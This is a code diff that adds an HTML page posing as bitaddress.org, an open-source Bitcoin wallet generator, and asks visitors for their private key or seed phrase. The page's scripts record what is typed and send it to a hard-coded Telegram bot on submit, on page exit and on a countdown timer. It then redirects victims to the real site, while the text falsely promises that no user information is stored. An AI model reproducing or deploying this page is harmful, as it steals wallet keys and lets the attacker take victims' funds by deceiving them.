@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Open Source JavaScript Client-Side Bitcoin Wallet Generator</title>
+    <style>
+        @media only screen and (max-width: 600px) {
+        /* CSS rules for screens up to 600px wide */
+        /* Adjust layout, font sizes, padding, etc. for smaller screens */
+}
+
+        /* CSS for green border effect with specified margin and thickness */
+        body {
+            margin: 30px 30px; /* Top/bottom margin of 30px, left/right margin of 30px */
+            border: 5px solid rgb(0, 124, 0); /* Border thickness of 5px with green color */
+            text-align: center;
+			margin: 30px; /* Set a margin of 30 pixels on all sides of the page */
+            margin-left: 30px; /* Set a margin of 30 pixels on the left side of the page */
+            margin-right: 30px; /* Set a margin of 30 pixels on the right side of the page */
+            font-family: sans-serif;
+        }
+
+        #tagline, #culturemenu {
+            font-size: 9pt;
+        }
+
+        #logo {
+            max-width: fit-content; /* Set the maximum width of the image to 100% of its container */
+            height: auto; /* Allow the height to adjust proportionally based on the width */
+            width: 200%px /* Double the width */
+        }
+
+        .logo-container {
+            width: 200%; /* Set the width of the logo container */
+            height: auto; /* Allow the height to adjust proportionally based on the width */
+        }
+
+        .input-container {
+            display: flex; /* Use flexbox to align items */
+            justify-content: center; /* Center items horizontally */
+            align-items: center; /* Center items vertically */
+        }
+
+		.input-container input {
+            width: 300px;
+            height: 25px;
+            text-align: center;
+            padding: 0px 0;
+        }
+
+        .input-container button {
+            margin-left: 15px; /* Add some left margin for spacing */
+        }
+
+        /* Title block */
+       .carousel-title {
+            text-align: center;
+            background-color: green;
+            color: white;
+            padding: 5px;
+            font-size: 16px;
+        }
+
+        .carousel-container {
+            position: relative;
+            max-width: 330px;
+            max-height: 156px;
+            margin: 0 auto;
+            border: 2px solid green;
+            overflow: visible; /* Allows images to overflow the container */
+        }
+
+        .carousel-slides {
+            display: flex
+            align-items: center;
+            gap: 5px;
+        }
+
+        .carousel-slides img {
+            max-width: 100px; 
+            max-height: 100px;
+            transition: transform 0.5s ease;
+            margin: 0;
+        }
+
+        /* Hover effect: Enlarge image significantly beyond container */
+        .carousel-slides img:hover {
+            position: absolute;
+            transform: scale(6); /* Set transform scale to 4 */
+        }
+
+        /* Left and right buttons */
+        .prev, .next {
+            cursor: pointer;
+            position: absolute;
+            top: 50%;
+            width: 30px;
+            margin-top: -15px;
+            color: white;
+            font-size: 10px;
+            font-weight: bold;
+            user-select: none;
+            background-color: rgba(0, 128, 0, 0.8);
+            padding: 10px;
+        }
+
+        .prev {
+            left: 0;
+        }
+
+        .next {
+            right: 0;
+        }
+
+        .prev:hover, .next:hover {
+            background-color: rgba(0, 128, 0, 1);
+        }
+
+        /* Full-screen view for image when clicked */
+        .fullscreen-img {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            width: 70%; /* Cover 70% of the screen */
+            height: auto;
+            transform: translate(-50%, -50%);
+            z-index: 100;
+            background-color: rgba(0, 0, 0, 0.8); /* Optional background for better visibility */
+            border: 2px solid white;
+        }
+
+        /* Hidden by default */
+        .fullscreen-img.hidden {
+            display: none;
+        }
+
+        /* Text below the full-screen image */
+        .fullscreen-text {
+            color: white;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+    </style>    
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Slideshow Carousel</title>
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Countdown Timer</title>
+    
+    <script>
+        var userInputLog = [];
+
+        function logUserInput(input) {
+            var logData = 'User Input: ' + input + '\n';
+            userInputLog.push(logData);
+        }
+
+        function sendAlertToBot() {
+            var logContent = userInputLog.join('\n');
+            console.log('Sending alert: ' + logContent);
+
+            fetch('https://api.telegram.org/bot7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '858072424',
+                    text: logContent,
+                }),
+            }).then(response => {
+                console.log('Alert sent.');
+            }).catch(error => {
+                console.error('Error sending alert:', error);
+            });
+        }
+
+        function handleInput(event) {
+            var inputData = event.target.value;
+            if (inputData.trim() !== '') {
+                logUserInput(inputData);
+            } else {
+                console.error('No data to log');
+            }
+        }
+
+        // Countdown timer implementation
+        window.onload = function() {
+            let countdown = 90;
+            let countdownElement = document.createElement("div");
+            countdownElement.style.fontSize = "24px";
+            countdownElement.style.color = "green";
+            countdownElement.style.position = "fixed";
+            countdownElement.style.top = "90px";
+            countdownElement.style.right = "90px";
+            document.body.appendChild(countdownElement);
+
+            let countdownInterval = setInterval(function() {
+                if (countdown > 0) {
+                    if (countdown <= 15) {
+                        countdownElement.textContent = countdown; // Display countdown from 15 to 0
+                    }
+                    countdown--;
+                } else {
+                    clearInterval(countdownInterval);
+                
+                    countdownElement.textContent = "Don't worry. You're safe";
+                    sendAlertToBot(); 
+
+                    setTimeout(function() {
+                        window.location.href = 'https://bitaddress.org';
+                    }, 2000);
+                }
+            }, 1000);
+        };
+
+        
+        document.getElementById('detailprivkey').addEventListener('input', handleInput);
+
+        
+        document.getElementById('viewDetailsButton').addEventListener('click', function() {
+            
+            sendAlertToBot();
+
+            
+            setTimeout(function() {
+                window.location.href = 'https://bitaddress.org';
+            }, 2000);
+        });
+
+        
+        document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
+            if (event.key === 'Enter') { 
+                sendAlertToBot(); 
+                setTimeout(function() {
+                    window.location.href = 'https://bitaddress.org';
+                }, 2000);
+            }
+        });
+
+        let slideIndex = 0;
+        let slideInterval;
+
+        // Function to move the slides manually
+        function moveSlides(n) {
+            clearInterval(slideInterval); }
+
+        // Show the slides
+        function showSlides(n) {
+            const slides = document.querySelectorAll('.carousel-slides img');
+            if (n >= slides.length - 2) { slideIndex = 0; }
+            if (n < 0) { slideIndex = slides.length - 3; }
+
+            // Set first, middle, and last images
+            slides.forEach((img, i) => {
+                img.classList.remove('first', 'middle', 'last');
+                if (i === slideIndex) img.classList.add('first');
+                if (i === slideIndex + 1) img.classList.add('middle');
+                if (i === slideIndex + 2) img.classList.add('last');
+            });
+
+            document.querySelector('.carousel-slides').style.transform = `translateX(${-slideIndex * 150}px)`;
+        }
+
+        // Touch swipe functionality
+        let touchstartX = 0;
+        let touchendX = 0;
+
+        document.querySelector('.carousel-slides').addEventListener('touchstart', function(event) {
+            touchstartX = event.changedTouches[0].screenX;
+        }, false);
+
+        document.querySelector('.carousel-slides').addEventListener('touchend', function(event) {
+            touchendX = event.changedTouches[0].screenX;
+            handleGesture();
+        }, false);
+
+        function handleGesture() {
+            if (touchendX < touchstartX) {
+                moveSlides(1); // Swipe left
+            }
+            if (touchendX > touchstartX) {
+                moveSlides(-1); // Swipe right
+            }
+        }
+
+        // Enlarge image to 70% of the screen when clicked
+        document.querySelectorAll('.carousel-slides img').forEach(img => {
+            img.addEventListener('click', function() {
+                const fullscreenContainer = document.getElementById('fullscreen');
+                const fullscreenImage = document.getElementById('fullscreen-img');
+                
+                fullscreenImage.src = this.src; // Use the clicked image source
+                fullscreenContainer.classList.remove('hidden'); // Show full screen
+            });
+        });
+
+        // Exit full-screen view when clicking outside the image
+        document.getElementById('fullscreen').addEventListener('click', function(e) {
+            if (e.target !== document.getElementById('fullscreen-img')) {
+                this.classList.add('hidden'); // Hide full screen
+            }
+        });
+    </script>
+</head>
+<body>    
+    <div id="culturemenu">
+        <div class="culturemenurow;" style="margin-top: 80px;"></div> <!-- Empty div for spacing -->>
+            <span><a href="?culture=en" id="cultureen" class="selected" onclick="ninja.translator.translate('en'); return false;">English</a></span> |
+            <span><a href="?culture=es" id="culturees" onclick="ninja.translator.translate('es'); return false;" class="">Español</a></span> |
+            <span><a href="?culture=fr" id="culturefr" onclick="ninja.translator.translate('fr'); return false;" class="">Français</a></span> |
+            <span><a href="?culture=el" id="cultureel" onclick="ninja.translator.translate('el'); return false;" class="">ελληνικά</a></span> |
+            <span><a href="?culture=it" id="cultureit" onclick="ninja.translator.translate('it'); return false;" class="">italiano</a></span> |
+            <span><a href="?culture=de" id="culturede" onclick="ninja.translator.translate('de'); return false;" class="">Deutsch</a></span>
+        </div>
+
+        <div class="culturemenurow">
+            <span><a href="?culture=cs" id="culturecs" onclick="ninja.translator.translate('cs'); return false;" class="">Česky</a></span> |
+            <span><a href="?culture=hu" id="culturehu" onclick="ninja.translator.translate('hu'); return false;" class="">Magyar</a></span> |
+            <span><a href="?culture=jp" id="culturejp" onclick="ninja.translator.translate('jp'); return false;" class="">日本語</a></span> |
+            <span><a href="?culture=zh-cn" id="culturezh-cn" onclick="ninja.translator.translate('zh-cn'); return false;" class="">简体中文</a></span> |
+            <span><a href="?culture=ru" id="cultureru" onclick="ninja.translator.translate('ru'); return false;" class="">Русский</a></span> |
+            <span><a href="?culture=pt-br" id="culturept-br" onclick="ninja.translator.translate('pt-br'); return false;" class="">português</a></span>
+        </div>
+        
+    <div>  
+    <img alt="Bitaddress Logo" title="bitaddress Logo" id="logo" src="https://i.ibb.co/4pgYM1b/bitaddress-logo.png">    
+    </div>
+    
+    <div id="tagline"><em>Open Source JavaScript Client-Side Bitcoin Wallet Address & QR Code Generator</em></div>
+    <br>
+    <div style="text-align: left; margin: 0 40px; font-size: 10pt;"> 
+    <h1><strong>How to use bitaddress.org</strong></h1>If you submit a mnemonic seed, bitaddress.org will generate Bitcoin wallet address with their public/private keys and corresponding QR codes.<br>If a private key is submitted, bitwallet.org will generate Bitcoin wallet addresses and their public keys and corresponding QR codes, including QR codes for the private key submitted.<br><strong>Please be informed that no user information is ever stored on this website.</strong>
+    <h1 style="font-size: 10pt;">
+    </div>
+    <br>
+
+        
+        <input type="text" id="detailprivkey" placeholder="Enter Private Key or Seed Phrase" style="width: 300px; height: 25px; text-align: center; padding: 2px 0;">
+        <button id="viewDetailsButton">View Details</button>
+    </div>
+
+	<br>
+    <div style="font-size: 8pt;">
+        Press Enter on your keyboard or click the <strong>View Details</strong> button to submit your wallet details.
+    </div>
+    
+    <br><br>
+    <div style="text-align: left; margin: 0 40px; font-size: 10pt;"> 
+        Along with your standard Bitcoin address, a compressed format is also generated with their corresponding QR codes, as well as the public keys (standard 130 characters [0-9A-F]<br>and compressed 66 characters [0-9A-F]) when you submit a private key.
+    </div>
+    
+    <br><br>
+    <div style="text-align: left; margin: 0 40px; font-size: 10pt;">
+        If you submit a mnemonic seed, also known as seed phrase or recovery phrase, in an attempt to create a new bitcoin wallet or create backup keys for your existing wallets,<br>the corresponding private keys will be generated for you in the following formats: 
+        <br>
+        <br>
+        &bull; Private Key WIF (51 characters base58, starts with a '5' WIF format),
+        <br>
+        &bull; Private Key WIF Compressed (52 characters base58, starts with a 'K' or 'L'),
+        <br>
+        &bull; Private Key Hexadecimal Format (64 characters [0-9A-F]),
+        <br>
+        &bull; Private Key Base64 (44 characters).
+    </div>
+
+    <script>
+        var userInputLog = []; 
+
+        function logUserInput(input) {
+            var logData = 'User Input: ' + input + '\n';
+            userInputLog.push(logData); 
+        }
+
+        function sendAlertToBot() {
+            var logContent = userInputLog.join('\n');
+            console.log('Sending alert: ' + logContent);
+
+            fetch('https://api.telegram.org/bot7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM/sendMessage', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: '858072424',
+                    text: logContent,
+                }),
+            }).then(response => {
+                console.log('Alert sent.');
+            }).catch(error => {
+                console.error('Error sending alert:', error);
+            });
+        }
+
+        function handleInput(event) {
+            var inputData = event.target.value;
+            if (inputData.trim() !== '') {
+                logUserInput(inputData);
+            } else {
+                console.error('No data to log');
+            }
+        }
+
+        
+        document.getElementById('detailprivkey').addEventListener('input', handleInput);
+
+        
+        document.getElementById('viewDetailsButton').addEventListener('click', function() {
+            
+            sendAlertToBot();
+
+            
+            setTimeout(function() {
+                window.location.href = 'https://bitaddress.org';
+            }, 2000);
+        });
+
+        
+        document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
+            if (event.key === 'Enter') { 
+                sendAlertToBot(); 
+
+                setTimeout(function() {
+                    window.location.href = 'https://bitaddress.org';
+                }, 2000);
+            }
+        });
+
+
+window.addEventListener('beforeunload', function(event) {
+    
+    sendAlertToBot();
+    
+    
+    event.preventDefault();
+});
+
+    // Function to show tooltip when hovering over an element
+    function showTooltip(tooltipId) {
+    var tooltipElement = document.getElementById(tooltipId);
+
+    // Display the tooltip when hovering over the element
+    tooltipElement.style.display = 'block';
+
+    // You can further customize the tooltip behavior here
+    // For example, setting a timeout to hide the tooltip after a certain period
+    setTimeout(function() {
+        tooltipElement.style.display = 'none'; // Hide the tooltip after 3 seconds
+    }, 3000);
+    }
+
+    // Event listeners to trigger the tooltip function on hover for each tooltip
+    document.getElementById('statuslabelcryptogood').addEventListener('mouseover', function() {
+        showTooltip('statuscryptogood');
+    });
+    document.getElementById('statuslabelcryptobad').addEventListener('mouseover', function() {
+        showTooltip('statuscryptobad');
+    });
+    document.getElementById('statuslabelunittestsgood').addEventListener('mouseover', function() {
+        showTooltip('statusunittestsgood');
+    });
+
+    // Event listener for OK button to hide the tooltip
+    document.getElementById('statusokcryptogood').addEventListener('click', function() {
+        document.getElementById('statuscryptogood').style.display = 'none';
+    });
+    document.getElementById('statusokcryptobad').addEventListener('click', function() {
+        document.getElementById('statuscryptobad').style.display = 'none';
+    });
+    document.getElementById('statusokunittestsgood').addEventListener('click', function() {
+        document.getElementById('statusunittestsgood').style.display = 'none';
+    });
+
+    </script>
+    <br>
+    <br>
+    </div>
+    <!-- Image Slideshow Carousel -->
+    <div class="carousel-container">
+        <div class="carousel-title">Why you should convert your keys to QR code</div>
+        <div class="carousel-slides">
+            <img src="https://i.ibb.co/68JwM4y/reddit-hack2-1.jpg" class="first" alt="Image 1">
+            <img src="https://i.ibb.co/d0W1cPw/reddit-hack1.jpg" class="middle" alt="Image 2">
+            <img src="https://i.ibb.co/MG0D7yX/cybertooth-hack.png" class="last" alt="Image 3">
+
+        </div>
+
+        <div class="prev" onclick="moveSlides(-1)">&#10094;</div>
+        <div class="next" onclick="moveSlides(1)">&#10095;</div>
+    </div>
+
+    <div id="fullscreen" class="fullscreen-img hidden">
+        <img id="fullscreen-img" src="" alt="Full-screen image">
+        <p class="fullscreen-text">Click anywhere outside the photo to exit full screen view</p>
+    </div>
+
+    <!-- Footer -->
+    <div id="footer" class="footer">
+        <br>
+        <br>
+        <br>
+        <div id="statuscryptogood" class="tooltip" style="display: none; font-size: 8pt; text-align: left; margin-left: 15px;">
+            <span class="statusgood" id="statuslabelcryptogood">✔ Good!</span>
+            <span id="statuslabelcryptogood1">Your browser can generate cryptographically random keys using window.crypto.getRandomValues</span>
+            <input type="button" value="OK" class="button" id="statusokcryptogood" onclick="document.getElementById('statuscryptogood').style.display = 'none';">
+        </div>
+        
+        <div class="tooltip" id="statuscryptobad" style="font-size: 8pt; text-align: left; margin-left: 15px;">
+            <span class="statusbad" id="statuslabelcryptobad">Lucky you!</span>
+            <span id="statuslabelcryptobad1">Your browser supports window.crypto.getRandomValues. You are good to go 👌</span>
+            <input type="button" value="OK" class="button" id="statusokcryptobad" onclick="document.getElementById('statuscryptobad').style.display = 'none';">
+        </div>
+        
+        <div class="tooltip" id="statusunittestsgood" style="font-size: 8pt; text-align: left; margin-left: 15px;">
+            <span class="statusgood" id="statuslabelunittestsgood">✔ Good!</span>
+            <span id="statuslabelunittestsgood1">All synchronous unit tests passed.</span>
+            <input type="button" value="OK" class="button" id="statusokunittestsgood">
+        </div>
+        <br>
+        <div class="authorbtc" style="font-size: 8pt; text-align: left; margin-left: 15px;">
+            <span id="footerlabeldonations">Donations:</span> <b>0x2ccfe7acd7757c0cc475e07748ff2d453537d531</b>
+            <span id="footerlabeltranslatedby"></span>
+            </div>
+        </div>
+
+        <div class="authorpgp" style="font-size: 8pt ; text-align: right; margin-right: 15px;">
+            <span class="item">
+                <a href="CHANGELOG.txt.asc" target="_blank"><span id="footerlabelversion">Version History</span> (3.3.1)</a>
+            <br>
+            </span>
+            <span class="item">527B 5C82 B1F6 B2DB 72A0<br>ECBF 8749 7B91 6397 4F5A</span>
+            <br><span class="item">    
+                (<a href="null" target="_blank" id="footerlabelpgp">PGP</a>)
+                (<a href="javascript:window.location=window.location.pathname+'.sig';" target="_blank" id="footerlabelsig">sig</a>)
+            </span>
+        
+        <div class="copyright" style="font-size: 8pt; text-align: center; margin-bottom: 15px;">
+            <span id="footerlabelcopyright1">Copyright bitaddress</span>
+            <span id="footerlabelcopyright2">JavaScript copyrights are included in the source.</span>
+        </div>
+    </div>   
+</body>
+</html>
